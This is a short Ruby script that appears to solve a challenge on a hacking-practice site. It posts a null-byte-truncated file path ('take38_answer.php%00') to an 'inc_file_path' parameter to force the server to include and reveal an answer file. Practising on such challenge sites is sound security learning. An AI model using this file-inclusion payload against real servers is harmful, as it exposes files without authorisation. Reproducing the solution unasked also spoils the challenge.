#!/usr/bin/ruby
require 'json'
require 'mechanize'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/ajax_take38.php')
mech.post(uri,{'inc_file_path'=>"take38_answer.php%00"})
p JSON.parse(mech.page.body)